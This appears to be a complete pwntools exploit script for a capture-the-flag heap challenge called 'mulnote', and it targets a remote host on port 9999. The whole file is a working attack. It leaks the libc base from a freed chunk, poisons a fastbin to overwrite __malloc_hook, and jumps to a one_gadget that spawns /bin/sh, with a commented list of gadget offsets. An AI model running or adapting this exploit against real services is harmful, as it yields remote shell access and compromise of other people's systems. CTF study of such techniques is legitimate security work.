from pwn import *
def cmd(c):
	p.sendlineafter(">",str(c))
def add(size,c="A"):
	cmd("C")
	p.sendlineafter(">",str(size))
	p.sendafter(">",c)
def edit(idx,c):
	cmd("E")
	cmd(idx)
	p.sendafter(">",c)
def show():
	cmd("S")
def free(idx):
	cmd("R")
	cmd(idx)
context.log_level='debug'
context.arch='amd64'
libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
#p=process('./mulnote')
p=remote("112.126.101.96",9999)
add(0x88)#0
add(0x68)#1
free(0)
show()
p.readuntil(":\n")
base=u64(p.readline()[:-1].ljust(0x8,'\x00'))-(0x7f39a22bbb78-0x7f39a1ef7000)
log.warning(hex(base))
add(0x88)#2
add(0x68,"A"*0x18)#3
add(0x68)#4
free(4)
free(3)
edit(3,p64(libc.sym['__malloc_hook']+base-35))
add(0x68)
one=0x4526a
add(0x68,"\x00"*19+p64(one+base))
p.readuntil("[Q]uit\n")

cmd(1)
#gdb.attach(p,'b free')

#free(2)
"""
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
#free(5)
p.interactive('n132>')
